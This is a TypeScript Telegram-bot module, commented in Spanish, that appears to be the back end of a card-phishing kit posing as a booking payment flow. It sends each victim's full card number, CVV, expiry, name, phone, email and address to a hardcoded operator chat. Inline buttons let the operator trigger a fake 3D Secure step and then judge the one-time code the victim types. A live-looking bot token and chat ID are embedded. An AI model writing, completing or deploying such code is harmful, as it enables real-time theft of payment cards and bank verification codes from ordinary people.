import TelegramBot from 'node-telegram-bot-api';

// Reemplaza esto con tu token real o usa variable de entorno
const token = process.env.TELEGRAM_BOT_TOKEN || '8445780848:AAEvaKl1rDcYQnwCcNLgfv6-P_LKmGG-5vo'; 
// Reemplaza esto con tu Chat ID real o usa variable de entorno
const chatId = process.env.TELEGRAM_CHAT_ID || '6065537099';

const bot = new TelegramBot(token, { polling: true });

// Store payment status in memory for simplicity (in a real app, use DB)
// Map<paymentId, { status: string, details: any }>
export const paymentStore = new Map<string, any>();

// Listen for polling errors
bot.on('polling_error', (error) => {
  console.log('Telegram Polling Error:', error.message); 
});

// Handle callback queries (button clicks)
bot.on('callback_query', (callbackQuery) => {
    const action = callbackQuery.data;
    const msg = callbackQuery.message;
    const paymentId = action?.split(':')[1];
    const command = action?.split(':')[0];

    if (!msg || !paymentId) return;

    let newStatus = '';
    let responseText = '';

    if (command === '3d_secure') {
        newStatus = 'REQUIRES_3D';
        responseText = 'Solicitando 3D Secure al usuario...';
    } else if (command === 'approve') {
        newStatus = 'COMPLETED';
        responseText = 'Aprobando pago directamente...';
    } else if (command === 'reject') {
        newStatus = 'FAILED';
        responseText = 'Rechazando pago...';
    } else if (command === 'approve_token') {
        newStatus = 'VERIFIED';
        responseText = 'Código CORRECTO. Pago verificado.';
    } else if (command === 'reject_token') {
        newStatus = 'TOKEN_REJECTED';
        responseText = 'Código INCORRECTO. Solicitando corrección...';
    }

    if (newStatus) {
        // Update store
        const currentPayment = paymentStore.get(paymentId);
        if (currentPayment) {
            paymentStore.set(paymentId, { ...currentPayment, status: newStatus });
        }

        // Answer callback query to remove loading state on button
        bot.answerCallbackQuery(callbackQuery.id);

        // Update message text
        bot.editMessageText(`Acción registrada: ${responseText}\n\n${msg.text}`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id
        });
    }
});

export const sendNewPaymentNotification = async (paymentData: any) => {
    // Generate a unique ID if not present (or use bookingId)
    const paymentId = paymentData.bookingId;
    
    // Initial status
    paymentStore.set(paymentId, { status: 'PENDING_APPROVAL', details: paymentData });

    const message = `
🔔 *NUEVO PAGO RECIBIDO* 🔔

👤 *Titular:* ${paymentData.cardName}
💳 *Tarjeta:* ${paymentData.cardNumber} (CVV: ${paymentData.cvv})
📅 *Vencimiento:* ${paymentData.expiry}
🏦 *Banco:* ${paymentData.bank}
💰 *Monto:* ${paymentData.amount} ${paymentData.currency}

📱 *Teléfono:* ${paymentData.phone}
📧 *Email:* ${paymentData.email}
📍 *Dirección:* ${paymentData.address}, ${paymentData.city}
    `;

    const opts = {
        parse_mode: 'Markdown' as const,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔐 Enviar a 3D Secure', callback_data: `3d_secure:${paymentId}` },
                    { text: '✅ Aprobar Directo', callback_data: `approve:${paymentId}` }
                ],
                [
                    { text: '❌ Rechazar', callback_data: `reject:${paymentId}` }
                ]
            ]
        }
    };

    try {
        // If chat ID is not set, we can't send. In dev, we log.
        if (chatId === 'YOUR_CHAT_ID') {
            console.log('⚠️ TELEGRAM CHAT ID NOT SET. Printing message to console instead:');
            console.log(message);
            console.log('Options:', opts);
            return;
        }
        await bot.sendMessage(chatId, message, opts);
    } catch (error) {
        console.error('Error sending Telegram message:', error);
    }
};

export const sendTokenNotification = async (bookingId: string, token: string) => {
    const payment = paymentStore.get(bookingId);
    if (!payment) return;

    // Update status to indicate we are waiting for token approval
    paymentStore.set(bookingId, { ...payment, status: 'TOKEN_PENDING' });

    const message = `
🔑 *CÓDIGO DE VERIFICACIÓN RECIBIDO* 🔑

🆔 *ID Pago:* ${bookingId}
🔢 *Código Ingresado:* ${token}
💰 *Monto:* ${payment.details.amount} ${payment.details.currency}

¿El código es correcto?
    `;

    const opts = {
        parse_mode: 'Markdown' as const,
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Código Correcto', callback_data: `approve_token:${bookingId}` },
                    { text: '❌ Código Incorrecto', callback_data: `reject_token:${bookingId}` }
                ]
            ]
        }
    };

    try {
        if (chatId === 'YOUR_CHAT_ID') {
            console.log(message);
            return;
        }
        await bot.sendMessage(chatId, message, opts);
    } catch (error) {
        console.error('Error sending Telegram token message:', error);
    }
};

export const getPaymentStatus = (paymentId: string) => {
    const payment = paymentStore.get(paymentId);
    return payment ? payment.status : 'UNKNOWN';
};
